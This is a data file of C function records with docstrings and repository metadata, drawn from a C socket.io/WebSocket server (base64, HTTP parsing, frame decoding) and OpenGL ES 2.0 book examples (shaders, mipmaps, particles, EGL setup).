{"docstring": "/**\n* encode an array of bytes using Base64 ( RFC 3548 )\n*\n* @param source the source buffer\n* @param sourcelen the length of the source buffer\n* @param target the target buffer\n* @param targetlen the length of the target buffer\n* @return 1 on success, 0 otherwise\n*/\n", "func_signal": "int base64_encode( unsigned char *source, size_t sourcelen, char *target, size_t targetlen )", "code": "{\n\t/* check if the result will fit in the target buffer */\n\tif ( ( sourcelen+2 )/3*4 > targetlen-1 )\n\t\treturn 0;\n\n\t/* encode all full triples */\n\twhile ( sourcelen >= 3 )\n\t{\n\t\t_base64_encode_triple( source, target );\n\t\tsourcelen -= 3;\n\t\tsource += 3;\n\t\ttarget += 4;\n\t}\n\n\t/* encode the last one or two characters */\n\tif ( sourcelen > 0 )\n\t{\n\t\tunsigned char temp[ 3 ] ;\n\t\tmemset( temp, 0, sizeof( temp ) );\n\t\tmemcpy( temp, source, sourcelen );\n\t\t_base64_encode_triple( temp, target );\n\t\ttarget[ 3 ] = '=';\n\t\tif ( sourcelen == 1 )\n\t\t\ttarget[ 2 ] = '=';\n\n\t\ttarget += 4;\n\t}\n\n\t/* terminate the string */\n\ttarget[ 0 ] = 0;\n\n\treturn 1;\n}", "path": "include\\c-websocket\\base64.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/*static void htmlfile_polling_output_finish(client_t *client, char *http_msg) {\n    char body_msg[] = \"0\\r\\n\\r\\n\";\n\n    write_output(client, body_msg, on_close);\n}*/\n", "func_signal": "static void _timeout_callback(struct ev_timer *time_handle)", "code": "{\n    if (time_handle) {\n        client_t *client = time_handle->data;\n        ev_timer_set(&client->timeout, global_config->heartbeat_interval, 0);\n        ev_timer_start(ev_default_loop(0), &client->timeout);\n    }\n}", "path": "htmlfile.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/* Verify that we can pause parsing at any of the bytes in the\n * message and still get the result that we're expecting. */\n", "func_signal": "void\ntest_message_pause (const struct message *msg)", "code": "{\n  char *buf = (char*) msg->raw;\n  size_t buflen = strlen(msg->raw);\n  size_t nread;\n\n  parser_init(msg->type);\n\n  do {\n    nread = parse_pause(buf, buflen);\n\n    // We can only set the upgrade buffer once we've gotten our message\n    // completion callback.\n    if (messages[0].message_complete_cb_called &&\n        msg->upgrade &&\n        parser->upgrade) {\n      messages[0].upgrade = buf + nread;\n      goto test;\n    }\n\n    if (nread < buflen) {\n\n      // Not much do to if we failed a strict-mode check\n      if (HTTP_PARSER_ERRNO(parser) == HPE_STRICT) {\n        parser_free();\n        return;\n      }\n\n      assert (HTTP_PARSER_ERRNO(parser) == HPE_PAUSED);\n    }\n\n    buf += nread;\n    buflen -= nread;\n    http_parser_pause(parser, 0);\n  } while (buflen > 0);\n\n  nread = parse_pause(NULL, 0);\n  assert (nread == 0);\n\ntest:\n  if (num_messages != 1) {\n    printf(\"\\n*** num_messages != 1 after testing '%s' ***\\n\\n\", msg->name);\n    exit(1);\n  }\n\n  if(!message_eq(0, msg)) exit(1);\n\n  parser_free();\n}", "path": "include\\http-parser\\test.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/**\n* encode three bytes using base64 ( RFC 3548 )\n*\n* @param triple three bytes that should be encoded\n* @param result buffer of four characters where the result is stored\n*/\n", "func_signal": "void _base64_encode_triple( unsigned char triple[ 3 ] , char result[ 4 ] )", "code": "{\n\tint tripleValue, i;\n\n\ttripleValue = triple[ 0 ] ;\n\ttripleValue *= 256;\n\ttripleValue += triple[ 1 ];\n\ttripleValue *= 256;\n\ttripleValue += triple[ 2 ];\n\n\tfor ( i=0; i<4; i++ )\n\t{\n\t\tresult[ 3-i ] = BASE64_CHARS[ tripleValue%64 ];\n\t\ttripleValue /= 64;\n\t}\n}", "path": "include\\c-websocket\\base64.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/* Our URL parser.\n *\n * This is designed to be shared by http_parser_execute() for URL validation,\n * hence it has a state transition + byte-for-byte interface. In addition, it\n * is meant to be embedded in http_parser_parse_url(), which does the dirty\n * work of turning state transitions URL components for its API.\n *\n * This function should only be invoked with non-space characters. It is\n * assumed that the caller cares about (and can detect) the transition between\n * URL and non-URL states by looking for these.\n */\n", "func_signal": "static enum state\nparse_url_char(enum state s, const char ch, int is_connect)", "code": "{\n  assert(!isspace(ch));\n\n  switch (s) {\n    case s_req_spaces_before_url:\n      if (ch == '/' || ch == '*') {\n        return s_req_path;\n      }\n\n      /* Proxied requests are followed by scheme of an absolute URI (alpha).\n       * CONNECT is followed by a hostname, which begins with alphanum.\n       * All other methods are followed by '/' or '*' (handled above).\n       */\n      if (IS_ALPHA(ch) || (is_connect && IS_NUM(ch))) {\n        return (is_connect) ? s_req_host : s_req_schema;\n      }\n\n      break;\n\n    case s_req_schema:\n      if (IS_ALPHA(ch)) {\n        return s;\n      }\n\n      if (ch == ':') {\n        return s_req_schema_slash;\n      }\n\n      break;\n\n    case s_req_schema_slash:\n      if (ch == '/') {\n        return s_req_schema_slash_slash;\n      }\n\n      break;\n\n    case s_req_schema_slash_slash:\n      if (ch == '/') {\n        return s_req_host;\n      }\n\n      break;\n\n    case s_req_host:\n      if (IS_HOST_CHAR(ch)) {\n        return s;\n      }\n\n      switch (ch) {\n        case ':':\n          return s_req_port;\n\n        case '/':\n          return s_req_path;\n\n        case '?':\n          return s_req_query_string_start;\n      }\n\n      break;\n\n    case s_req_port:\n      if (IS_NUM(ch)) {\n        return s;\n      }\n\n      switch (ch) {\n        case '/':\n          return s_req_path;\n\n        case '?':\n          return s_req_query_string_start;\n      }\n\n      break;\n\n    case s_req_path:\n      if (IS_URL_CHAR(ch)) {\n        return s;\n      }\n\n      switch (ch) {\n        case '?':\n          return s_req_query_string_start;\n\n        case '#':\n          return s_req_fragment_start;\n      }\n\n      break;\n\n    case s_req_query_string_start:\n      if (IS_URL_CHAR(ch)) {\n        return s_req_query_string;\n      }\n\n      switch (ch) {\n        case '?':\n          /* XXX ignore extra '?' ... is this right? */\n          return s;\n\n        case '#':\n          return s_req_fragment_start;\n      }\n\n      break;\n\n    case s_req_query_string:\n      if (IS_URL_CHAR(ch)) {\n        return s;\n      }\n\n      switch (ch) {\n        case '?':\n          /* allow extra '?' in query string */\n          return s;\n\n        case '#':\n          return s_req_fragment_start;\n      }\n\n      break;\n\n    case s_req_fragment_start:\n      if (IS_URL_CHAR(ch)) {\n        return s_req_fragment;\n      }\n\n      switch (ch) {\n        case '?':\n          return s_req_fragment;\n\n        case '#':\n          return s;\n      }\n\n      break;\n\n    case s_req_fragment:\n      if (IS_URL_CHAR(ch)) {\n        return s;\n      }\n\n      switch (ch) {\n        case '?':\n        case '#':\n          return s;\n      }\n\n      break;\n\n    default:\n      break;\n  }\n\n  /* We should never fall out of the switch above unless there's an error */\n  return s_dead;\n}", "path": "include\\http-parser\\http_parser.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/**\n* determine the value of a base64 encoding character\n*\n* @param base64char the character of which the value is searched\n* @return the value in case of success ( 0-63 ), -1 on failure\n*/\n", "func_signal": "int _base64_char_value( char base64char )", "code": "{\n\tif ( base64char >= 'A' && base64char <= 'Z' )\n\t\treturn base64char-'A';\n\tif ( base64char >= 'a' && base64char <= 'z' )\n\t\treturn base64char-'a'+26;\n\tif ( base64char >= '0' && base64char <= '9' )\n\t\treturn base64char-'0'+2*26;\n\tif ( base64char == '+' )\n\t\treturn 2*26+10;\n\tif ( base64char == '/' )\n\t\treturn 2*26+11;\n\treturn -1;\n}", "path": "include\\c-websocket\\base64.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/*\nshort WEBSOCKET_valid_connection( const char *data )\n@data - entire data received with socket\n@return - 0 = false / 1 = true */\n", "func_signal": "short WEBSOCKET_valid_connection( const char *data )", "code": "{\n\tchar *connection_header = ( char * )malloc( 64 * sizeof( char ) );\n\tshort result = 0;\n\n\tREQUEST_get_header_value( data, \"Connection:\", connection_header, 64 );\n\n\tif( connection_header == NULL ) {\n\t\treturn 0;\n\t}\n\n\tresult = ( strstr( data, WEBSOCKET_KEY_HEADER ) != NULL && ( strstr( connection_header, \"Upgrade\" ) != NULL || strstr( connection_header, \"upgrade\" ) != NULL) );\n\n\tif( connection_header ) {\n\t\tfree( connection_header );\n\t\tconnection_header = NULL;\n\t}\n\n\treturn result;\n}", "path": "include\\c-websocket\\cWebSockets.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/* Given a sequence of bytes and the number of these that we were able to\n * parse, verify that upgrade bodies are correct.\n */\n", "func_signal": "void\nupgrade_message_fix(char *body, const size_t nread, const size_t nmsgs, ...)", "code": "{\n  va_list ap;\n  size_t i;\n  size_t off = 0;\n \n  va_start(ap, nmsgs);\n\n  for (i = 0; i < nmsgs; i++) {\n    struct message *m = va_arg(ap, struct message *);\n\n    off += strlen(m->raw);\n\n    if (m->upgrade) {\n      off -= strlen(m->upgrade);\n\n      /* Check the portion of the response after its specified upgrade */\n      if (!check_str_eq(m, \"upgrade\", body + off, body + nread)) {\n        exit(1);\n      }\n\n      /* Fix up the response so that message_eq() will verify the beginning\n       * of the upgrade */\n      *(body + nread + strlen(m->upgrade)) = '\\0';\n      messages[num_messages -1 ].upgrade = body + nread;\n\n      va_end(ap);\n      return;\n    }\n  }\n\n  va_end(ap);\n  printf(\"\\n\\n*** Error: expected a message with upgrade ***\\n\");\n\n  exit(1);\n}", "path": "include\\http-parser\\test.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/* Given a sequence of varargs messages, return the number of them that the\n * parser should successfully parse, taking into account that upgraded\n * messages prevent all subsequent messages from being parsed.\n */\n", "func_signal": "size_t\ncount_parsed_messages(const size_t nmsgs, ...)", "code": "{\n  size_t i;\n  va_list ap;\n\n  va_start(ap, nmsgs);\n\n  for (i = 0; i < nmsgs; i++) {\n    struct message *m = va_arg(ap, struct message *);\n\n    if (m->upgrade) {\n      va_end(ap);\n      return i + 1;\n    }\n  }\n\n  va_end(ap);\n  return nmsgs;\n}", "path": "include\\http-parser\\test.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/* These dontcall_* callbacks exist so that we can verify that when we're\n * paused, no additional callbacks are invoked */\n", "func_signal": "int\ndontcall_message_begin_cb (http_parser *p)", "code": "{\n  if (p) { } // gcc\n  fprintf(stderr, \"\\n\\n*** on_message_begin() called on paused parser ***\\n\\n\");\n  exit(1);\n}", "path": "include\\http-parser\\test.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/*\nint WEBSOCKET_get_content( const char *data, int data_length, unsigned char *dst )\n@data - entire data received with socket\n@data_length - size of @data\n@dst - pointer to char array, where the result will be stored\n@return - size of @dst */\n", "func_signal": "int WEBSOCKET_get_content( const char *data, int data_length, unsigned char *dst, const unsigned int dst_len )", "code": "{\n\tunsigned int i, j;\n\tunsigned char mask[4];\n\tunsigned int packet_length = 0;\n\tunsigned int length_code = 0;\n\tint index_first_mask = 0;\n\tint index_first_data_byte = 0;\n\n\tif( ( unsigned char )data[0] != 129 ) {\n\t\tdst = NULL;\n\t\tif( ( unsigned char )data[0] == 136 ) {\n\t\t\t/* WebSocket client disconnected */\n\t\t\treturn -2;\n\t\t}\n\t\t/* Unknown error */\n\t\treturn -1;\n\t}\n\n\tlength_code = ((unsigned char) data[1]) & 127;\n\n\tif( length_code <= 125 ) {\n\t\tindex_first_mask = 2;\n\n\t\tmask[0] = data[2];\n\t\tmask[1] = data[3];\n\t\tmask[2] = data[4];\n\t\tmask[3] = data[5];\n\t} else if( length_code == 126 ) {\n\t\tindex_first_mask = 4;\n\n\t\tmask[0] = data[4];\n\t\tmask[1] = data[5];\n\t\tmask[2] = data[6];\n\t\tmask[3] = data[7];\n\t} else if( length_code == 127 ) {\n\t\tindex_first_mask = 10;\n\n\t\tmask[0] = data[10];\n\t\tmask[1] = data[11];\n\t\tmask[2] = data[12];\n\t\tmask[3] = data[13];\n\t}\n\n\tindex_first_data_byte = index_first_mask + 4;\n\n\tpacket_length = data_length - index_first_data_byte;\n\n\tfor( i = index_first_data_byte, j = 0; i < data_length; i++, j++ ) {\n\t\tdst[ j ] = ( unsigned char )data[ i ] ^ mask[ j % 4];\n\t}\n\n\treturn packet_length;\n}", "path": "include\\c-websocket\\cWebSockets.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "///\n// Initialize the shader and program object\n//\n", "func_signal": "int Init ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n   int i;\n   \n   GLbyte vShaderStr[] =\n      \"uniform float u_time;\t\t                           \\n\"\n      \"uniform vec3 u_centerPosition;                       \\n\"\n      \"attribute float a_lifetime;                          \\n\"\n      \"attribute vec3 a_startPosition;                      \\n\"\n      \"attribute vec3 a_endPosition;                        \\n\"\n      \"varying float v_lifetime;                            \\n\"\n      \"void main()                                          \\n\"\n      \"{                                                    \\n\"\n      \"  if ( u_time <= a_lifetime )                        \\n\"\n      \"  {                                                  \\n\"\n      \"    gl_Position.xyz = a_startPosition +              \\n\"\n      \"                      (u_time * a_endPosition);      \\n\"\n      \"    gl_Position.xyz += u_centerPosition;             \\n\"\n      \"    gl_Position.w = 1.0;                             \\n\"\n      \"  }                                                  \\n\"\n      \"  else                                               \\n\"\n      \"     gl_Position = vec4( -1000, -1000, 0, 0 );       \\n\"\n      \"  v_lifetime = 1.0 - ( u_time / a_lifetime );        \\n\"\n      \"  v_lifetime = clamp ( v_lifetime, 0.0, 1.0 );       \\n\"\n      \"  gl_PointSize = ( v_lifetime * v_lifetime ) * 40.0; \\n\"\n      \"}\";\n      \n   GLbyte fShaderStr[] =  \n      \"precision mediump float;                             \\n\"\n      \"uniform vec4 u_color;\t\t                           \\n\"\n      \"varying float v_lifetime;                            \\n\"\n      \"uniform sampler2D s_texture;                         \\n\"\n      \"void main()                                          \\n\"\n      \"{                                                    \\n\"\n      \"  vec4 texColor;                                     \\n\"\n      \"  texColor = texture2D( s_texture, gl_PointCoord );  \\n\"\n      \"  gl_FragColor = vec4( u_color ) * texColor;         \\n\"\n      \"  gl_FragColor.a *= v_lifetime;                      \\n\"\n      \"}                                                    \\n\";\n\n   // Load the shaders and get a linked program object\n   userData->programObject = esLoadProgram ( vShaderStr, fShaderStr );\n\n   // Get the attribute locations\n   userData->lifetimeLoc = glGetAttribLocation ( userData->programObject, \"a_lifetime\" );\n   userData->startPositionLoc = glGetAttribLocation ( userData->programObject, \"a_startPosition\" );\n   userData->endPositionLoc = glGetAttribLocation ( userData->programObject, \"a_endPosition\" );\n   \n   // Get the uniform locations\n   userData->timeLoc = glGetUniformLocation ( userData->programObject, \"u_time\" );\n   userData->centerPositionLoc = glGetUniformLocation ( userData->programObject, \"u_centerPosition\" );\n   userData->colorLoc = glGetUniformLocation ( userData->programObject, \"u_color\" );\n   userData->samplerLoc = glGetUniformLocation ( userData->programObject, \"s_texture\" );\n\n   glClearColor ( 0.0f, 0.0f, 0.0f, 0.0f );\n\n   // Fill in particle data array\n   srand ( 0 );\n   for ( i = 0; i < NUM_PARTICLES; i++ )\n   {\n      float *particleData = &userData->particleData[i * PARTICLE_SIZE];\n   \n      // Lifetime of particle\n      (*particleData++) = ( (float)(rand() % 10000) / 10000.0f );\n\n      // End position of particle\n      (*particleData++) = ( (float)(rand() % 10000) / 5000.0f ) - 1.0f;\n      (*particleData++) = ( (float)(rand() % 10000) / 5000.0f ) - 1.0f;\n      (*particleData++) = ( (float)(rand() % 10000) / 5000.0f ) - 1.0f;\n\n      // Start position of particle\n      (*particleData++) = ( (float)(rand() % 10000) / 40000.0f ) - 0.125f;\n      (*particleData++) = ( (float)(rand() % 10000) / 40000.0f ) - 0.125f;\n      (*particleData++) = ( (float)(rand() % 10000) / 40000.0f ) - 0.125f;\n\n   }\n\n   // Initialize time to cause reset on first update\n   userData->time = 1.0f;\n\n   userData->textureId = LoadTexture ( \"smoke.tga\" );\n   if ( userData->textureId <= 0 )\n   {\n      return FALSE;\n   }\n   \n   return TRUE;\n}", "path": "LinuxX11\\Chapter_13\\ParticleSystem\\ParticleSystem.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// Cleanup\n//\n", "func_signal": "void ShutDown ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n\n   // Delete texture object\n   glDeleteTextures ( 1, &userData->textureId );\n\n   // Delete program object\n   glDeleteProgram ( userData->programObject );\n\n   free ( esContext->userData);\n}", "path": "LinuxX11\\Chapter_9\\TextureWrap\\TextureWrap.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// Create a mipmapped 2D texture image \n//\n", "func_signal": "GLuint CreateMipMappedTexture2D( )", "code": "{\n   // Texture object handle\n   GLuint textureId;\n   int    width = 256,\n          height = 256;\n   int    level;\n   GLubyte *pixels;\n   GLubyte *prevImage;\n   GLubyte *newImage;\n      \n   pixels = GenCheckImage( width, height, 8 );\n   if ( pixels == NULL )\n      return 0;\n\n   // Generate a texture object\n   glGenTextures ( 1, &textureId );\n\n   // Bind the texture object\n   glBindTexture ( GL_TEXTURE_2D, textureId );\n\n   // Load mipmap level 0\n   glTexImage2D ( GL_TEXTURE_2D, 0, GL_RGB, width, height, \n                  0, GL_RGB, GL_UNSIGNED_BYTE, pixels );\n   \n   level = 1;\n   prevImage = &pixels[0];\n   \n   while ( width > 1 && height > 1 )\n   {\n      int newWidth,\n          newHeight;\n\n      // Generate the next mipmap level\n      GenMipMap2D( prevImage, &newImage, width, height, \n                   &newWidth, &newHeight );\n\n      // Load the mipmap level\n      glTexImage2D( GL_TEXTURE_2D, level, GL_RGB, \n                    newWidth, newHeight, 0, GL_RGB,\n                    GL_UNSIGNED_BYTE, newImage );\n\n      // Free the previous image\n      free ( prevImage );\n\n      // Set the previous image for the next iteration\n      prevImage = newImage;\n      level++;\n\n      // Half the width and height\n      width = newWidth;\n      height = newHeight;\n   }\n\n   free ( newImage );\n\n   // Set the filtering mode\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST_MIPMAP_NEAREST );\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR );\n\n   return textureId;\n\n}", "path": "LinuxX11\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// CreateEGLContext()\n//\n//    Creates an EGL rendering context and all associated elements\n//\n", "func_signal": "EGLBoolean CreateEGLContext ( EGLNativeWindowType hWnd, EGLDisplay* eglDisplay,\n                              EGLContext* eglContext, EGLSurface* eglSurface,\n                              EGLint attribList[])", "code": "{\n   EGLint numConfigs;\n   EGLint majorVersion;\n   EGLint minorVersion;\n   EGLDisplay display;\n   EGLContext context;\n   EGLSurface surface;\n   EGLConfig config;\n   EGLint contextAttribs[] = { EGL_CONTEXT_CLIENT_VERSION, 2, EGL_NONE, EGL_NONE };\n\n   // Get Display\n   display = eglGetDisplay(GetDC(hWnd));\n   if ( display == EGL_NO_DISPLAY )\n   {\n      return EGL_FALSE;\n   }\n\n   // Initialize EGL\n   if ( !eglInitialize(display, &majorVersion, &minorVersion) )\n   {\n      return EGL_FALSE;\n   }\n\n   // Get configs\n   if ( !eglGetConfigs(display, NULL, 0, &numConfigs) )\n   {\n      return EGL_FALSE;\n   }\n\n   // Choose config\n   if ( !eglChooseConfig(display, attribList, &config, 1, &numConfigs) )\n   {\n      return EGL_FALSE;\n   }\n\n   // Create a surface\n   surface = eglCreateWindowSurface(display, config, (EGLNativeWindowType)hWnd, NULL);\n   if ( surface == EGL_NO_SURFACE )\n   {\n      return EGL_FALSE;\n   }\n\n   // Create a GL context\n   context = eglCreateContext(display, config, EGL_NO_CONTEXT, contextAttribs );\n   if ( context == EGL_NO_CONTEXT )\n   {\n      return EGL_FALSE;\n   }   \n   \n   // Make the context current\n   if ( !eglMakeCurrent(display, surface, surface, context) )\n   {\n      return EGL_FALSE;\n   }\n   \n   *eglDisplay = display;\n   *eglSurface = surface;\n   *eglContext = context;\n   return EGL_TRUE;\n}", "path": "Windows\\Common\\Source\\esUtil.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// Draw a triangle using the shader pair created in Init()\n//\n", "func_signal": "void Draw ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n   GLfloat vVertices[] = { -0.5f,  0.5f, 0.0f, 1.5f,  // Position 0\n                            0.0f,  0.0f,              // TexCoord 0 \n                           -0.5f, -0.5f, 0.0f, 0.75f, // Position 1\n                            0.0f,  1.0f,              // TexCoord 1\n                            0.5f, -0.5f, 0.0f, 0.75f, // Position 2\n                            1.0f,  1.0f,              // TexCoord 2\n                            0.5f,  0.5f, 0.0f, 1.5f,  // Position 3\n                            1.0f,  0.0f               // TexCoord 3\n                         };\n   GLushort indices[] = { 0, 1, 2, 0, 2, 3 };\n      \n   // Set the viewport\n   glViewport ( 0, 0, esContext->width, esContext->height );\n   \n   // Clear the color buffer\n   glClear ( GL_COLOR_BUFFER_BIT );\n\n   // Use the program object\n   glUseProgram ( userData->programObject );\n\n   // Load the vertex position\n   glVertexAttribPointer ( userData->positionLoc, 4, GL_FLOAT, \n                           GL_FALSE, 6 * sizeof(GLfloat), vVertices );\n   // Load the texture coordinate\n   glVertexAttribPointer ( userData->texCoordLoc, 2, GL_FLOAT,\n                           GL_FALSE, 6 * sizeof(GLfloat), &vVertices[4] );\n\n   glEnableVertexAttribArray ( userData->positionLoc );\n   glEnableVertexAttribArray ( userData->texCoordLoc );\n\n   // Bind the texture\n   glActiveTexture ( GL_TEXTURE0 );\n   glBindTexture ( GL_TEXTURE_2D, userData->textureId );\n\n   // Set the sampler texture unit to 0\n   glUniform1i ( userData->samplerLoc, 0 );\n\n   // Draw quad with nearest sampling\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST );\n   glUniform1f ( userData->offsetLoc, -0.6f );   \n   glDrawElements ( GL_TRIANGLES, 6, GL_UNSIGNED_SHORT, indices );\n\n   // Draw quad with trilinear filtering\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR );\n   glUniform1f ( userData->offsetLoc, 0.6f );\n   glDrawElements ( GL_TRIANGLES, 6, GL_UNSIGNED_SHORT, indices );\n\n}", "path": "LinuxX11\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// esLogMessage()\n//\n//    Log an error message to the debug output for the platform\n//\n", "func_signal": "void ESUTIL_API esLogMessage ( const char *formatStr, ... )", "code": "{\n    va_list params;\n    char buf[BUFSIZ];\n\n    va_start ( params, formatStr );\n    vsprintf_s ( buf, sizeof(buf),  formatStr, params );\n    \n    printf ( \"%s\", buf );\n    \n    va_end ( params );\n}", "path": "Windows\\Common\\Source\\esUtil.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "//\n///\n/// \\brief Load a shader, check for compile errors, print error messages to output log\n/// \\param type Type of shader (GL_VERTEX_SHADER or GL_FRAGMENT_SHADER)\n/// \\param shaderSrc Shader source string\n/// \\return A new shader object on success, 0 on failure\n//\n", "func_signal": "GLuint ESUTIL_API esLoadShader(GLenum type, const char *shaderSrc)", "code": "{\n    GLuint shader;\n    GLint compiled;\n\n    // Create the shader object\n    shader = glCreateShader(type);\n\n    if (shader == 0)\n        return 0;\n\n    // Load the shader source\n    glShaderSource(shader, 1, &shaderSrc, NULL);\n\n    // Compile the shader\n    glCompileShader(shader);\n\n    // Check the compile status\n    glGetShaderiv(shader, GL_COMPILE_STATUS, &compiled);\n\n    if (!compiled)\n    {\n        GLint infoLen = 0;\n\n        glGetShaderiv(shader, GL_INFO_LOG_LENGTH, &infoLen);\n\n        if (infoLen > 1)\n        {\n            char* infoLog = malloc(sizeof(char) * infoLen);\n\n            glGetShaderInfoLog(shader, infoLen, NULL, infoLog);\n            esLogMessage(\"Error compiling shader:\\n%s\\n\", infoLog);\n\n            free(infoLog);\n        }\n\n        glDeleteShader(shader);\n        return 0;\n    }\n\n    return shader;\n}", "path": "BlackBerry\\Common\\src\\esShader.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// Initialize the shader and program object\n//\n", "func_signal": "int Init ( ESContext *esContext )", "code": "{\n   esContext->userData = malloc(sizeof(UserData));\n\t\n   UserData *userData = esContext->userData;\n   GLbyte vShaderStr[] =\n      \"uniform float u_offset;      \\n\"\n      \"attribute vec4 a_position;   \\n\"\n      \"attribute vec2 a_texCoord;   \\n\"\n      \"varying vec2 v_texCoord;     \\n\"\n      \"void main()                  \\n\"\n      \"{                            \\n\"\n      \"   gl_Position = a_position; \\n\"\n      \"   gl_Position.x += u_offset;\\n\"\n      \"   v_texCoord = a_texCoord;  \\n\"\n      \"}                            \\n\";\n   \n   GLbyte fShaderStr[] =  \n      \"precision mediump float;                            \\n\"\n      \"varying vec2 v_texCoord;                            \\n\"\n      \"uniform sampler2D s_texture;                        \\n\"\n      \"void main()                                         \\n\"\n      \"{                                                   \\n\"\n      \"  gl_FragColor = texture2D( s_texture, v_texCoord );\\n\"\n      \"}                                                   \\n\";\n\n   // Load the shaders and get a linked program object\n   userData->programObject = esLoadProgram ( vShaderStr, fShaderStr );\n\n   // Get the attribute locations\n   userData->positionLoc = glGetAttribLocation ( userData->programObject, \"a_position\" );\n   userData->texCoordLoc = glGetAttribLocation ( userData->programObject, \"a_texCoord\" );\n   \n   // Get the sampler location\n   userData->samplerLoc = glGetUniformLocation ( userData->programObject, \"s_texture\" );\n\n   // Get the offset location\n   userData->offsetLoc = glGetUniformLocation( userData->programObject, \"u_offset\" );\n\n   // Load the texture\n   userData->textureId = CreateMipMappedTexture2D ();\n\n   glClearColor ( 0.0f, 0.0f, 0.0f, 0.0f );\n   return GL_TRUE;\n}", "path": "LinuxX11\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// Draw a triangle using the shader pair created in Init()\n//\n", "func_signal": "void Draw ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n      \n   // Set the viewport\n   glViewport ( 0, 0, esContext->width, esContext->height );\n   \n   // Clear the color buffer\n   glClear ( GL_COLOR_BUFFER_BIT );\n\n   // Use the program object\n   glUseProgram ( userData->programObject );\n\n   // Load the vertex attributes\n   glVertexAttribPointer ( userData->lifetimeLoc, 1, GL_FLOAT, \n                           GL_FALSE, PARTICLE_SIZE * sizeof(GLfloat), \n                           userData->particleData );\n   \n   glVertexAttribPointer ( userData->endPositionLoc, 3, GL_FLOAT,\n                           GL_FALSE, PARTICLE_SIZE * sizeof(GLfloat),\n                           &userData->particleData[1] );\n\n   glVertexAttribPointer ( userData->startPositionLoc, 3, GL_FLOAT,\n                           GL_FALSE, PARTICLE_SIZE * sizeof(GLfloat),\n                           &userData->particleData[4] );\n\n   \n   glEnableVertexAttribArray ( userData->lifetimeLoc );\n   glEnableVertexAttribArray ( userData->endPositionLoc );\n   glEnableVertexAttribArray ( userData->startPositionLoc );\n   // Blend particles\n   glEnable ( GL_BLEND );\n   glBlendFunc ( GL_SRC_ALPHA, GL_ONE );\n\n   // Bind the texture\n   glActiveTexture ( GL_TEXTURE0 );\n   glBindTexture ( GL_TEXTURE_2D, userData->textureId );\n   glEnable ( GL_TEXTURE_2D );\n\n   // Set the sampler texture unit to 0\n   glUniform1i ( userData->samplerLoc, 0 );\n\n   glDrawArrays( GL_POINTS, 0, NUM_PARTICLES );\n   \n   eglSwapBuffers ( esContext->eglDisplay, esContext->eglSurface );\n}", "path": "LinuxX11\\Chapter_13\\ParticleSystem\\ParticleSystem.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// Cleanup\n//\n", "func_signal": "void ShutDown ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n\n   // Delete texture object\n   glDeleteTextures ( 1, &userData->textureId );\n\n   // Delete program object\n   glDeleteProgram ( userData->programObject );\n\t\n   free(esContext->userData);\n}", "path": "LinuxX11\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
